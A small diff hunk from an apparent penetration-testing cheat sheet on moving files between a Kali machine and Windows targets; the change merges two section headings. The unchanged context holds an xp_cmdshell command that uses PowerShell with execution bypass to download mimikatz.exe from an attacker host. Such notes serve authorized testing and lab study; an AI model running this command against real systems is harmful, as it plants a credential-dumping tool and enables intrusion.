@@ -286,9 +286,7 @@ Kali port:
     ##SQL
     EXEC xp_cmdshell 'powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile(''http://<kali>:1234/mimikatz.exe'', ''C:\Windows\Tasks\mimikatz.exe'')"'
     
-    ###From Windows to Kali###
-
-    ###From netcat to Kali###
+    ###From Windows (netcat) to Kali###
     ##UploadServer
     --Kali terminal
     mkdir -p /home/kali/uploads
